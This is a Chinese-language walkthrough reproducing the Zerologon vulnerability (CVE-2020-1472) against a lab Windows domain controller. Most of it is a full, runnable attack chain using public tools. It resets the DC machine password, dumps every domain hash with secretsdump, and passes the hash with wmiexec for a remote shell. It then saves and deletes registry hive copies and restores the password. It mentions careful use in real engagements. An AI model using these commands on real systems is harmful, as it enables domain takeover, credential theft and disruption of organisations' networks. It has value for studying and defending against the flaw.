# NetLogon域内提权漏洞CVE-2020-1472

## 简介

CVE-2020-1472是一个windows域控中严重的远程权限提升漏洞，攻击者通过NetLogon，建立与域控间易受攻击的安全通道时，可利用此漏洞获取域管访问权限。

## 影响版本

Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
Windows Server 2012
Windows Server 2012 (Server Core installation)
Windows Server 2012 R2
Windows Server 2012 R2 (Server Core installation)
Windows Server 2016
Windows Server 2016 (Server Core installation)
Windows Server 2019
Windows Server 2019 (Server Core installation)
Windows Server, version 1903 (Server Core installation)
Windows Server, version 1909 (Server Core installation)
Windows Server, version 2004 (Server Core installation)

## 复现过程

1、查看域控主机名

```java
net group "domain controllers" /domain
```

2、判断漏洞是否存在

https://github.com/SecuraBV/CVE-2020-1472

```java
proxychains python3 zerologon_tester.py OWA2010CN-GOD 192.168.3.21
proxychains python3 zerologon_tester.py 域控主机名 域控地址
```

出现success代表存在漏洞

![Untitled](NetLogon%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9ECVE-2020-1472%20d255a5a45c7a4380b7d5d4e3d787061d/Untitled.png)

3、使用工具清空DC凭证

[https://github.com/risksense/zerologon](https://github.com/risksense/zerologon)

```java
python3  set_empty_pw  目标计算机名  目标IP

proxychains python3  set_empty_pw OWA2010CN-GOD 192.168.3.21
```

[https://github.com/mstxq17/cve-2020-1472](https://github.com/mstxq17/cve-2020-1472)

```java
proxychains python cve-2020-1472-exploit.py OWA2010CN-GOD 192.168.3.21
```

两个工具都可以

清空票据可能会导致脱域，实战中要小心使用！！！

4、获取域内HASH

使用impacket中的secretsdump.py脚本

```java
python3 secretsdump.py  域/目标计算机名/$@目标IP  -just-dc  -no-pass

proxychains python secretsdump.py OWA2010CN-GOD\$@192.168.3.21 -just-dc -no-pass
```

5、横向HASH传递

```java
proxychains python wmiexec.py -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21
```

如果没有利用成功，可能是已经脱域了，去掉域名

```java
proxychains python3  wmiexec.py  administrator@192.168.3.21  -hashes aad3b435b51404eeaad3b435b51404ee:afffeba176210fad4628f0524bfe1942
```

6、恢复密码，备份注册表，并保存到本地，保存后删除备份的注册表

```java
reg save HKLM/SYSTEM system.save
reg save HKLM/SAM sam.save
reg save HKLM/SECURITY security.save
lget system.save
lget sam.save
lget security.save
del /f system.save
del /f sam.save
del /f security.save
```

保存的文件在wmiexec.py脚本同一目录下

使用secretsdump.py脚本解析保存到本地的注册表备份

```java
python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL
```

`$MACHINE.ACC:plain_password_hex`:后的值为下一步恢复密码需要的值

7、使用zerologon中的reinstall_original_pw.py脚本恢复密码

```java
python3  reinstall_original_pw.py  目标计算机名  目标IP  之前获取的hash
例如：
proxychains  python3 reinstall_original_pw.py OWA2010CN-GOD 192.168.3.21 6d3d5fb71d3ea7b5a1f50b59768fe0da9c95f5fdf759d9db80559abac743a77b979677ad7b618ec9373bb49d0acc3708e59540b2e43fc24661e4aca71511f0789018b434c38b9e6c763865c1e308e2e9b63b1ca126c33e197f59ae14c3f0115fcd66fd4a88a5340f0546758f27de9261525a6d008cfe53271bd1d26ffe1af6c6e2ac59a32bb1cdf566ae80e57feabd4504e8a81f35668cce840ec26b3c576ae8177f47aa4477387b8aa438f8bca3f27a0d7044caae90aa9177beac0e8b5f0e9a63d0715b5be4cba5d5ffd5dacef3a32e05c7cbc1dc48f5292eafe27bbdc81376e7a2c713e009b1dd6f7e5ec7ec417d12
```

8、重复第3步，验证下是否恢复成功

[CVE2020-1472 域内提权漏洞复现](https://www.exterminate-dog.com/2022/01/17/2022002/)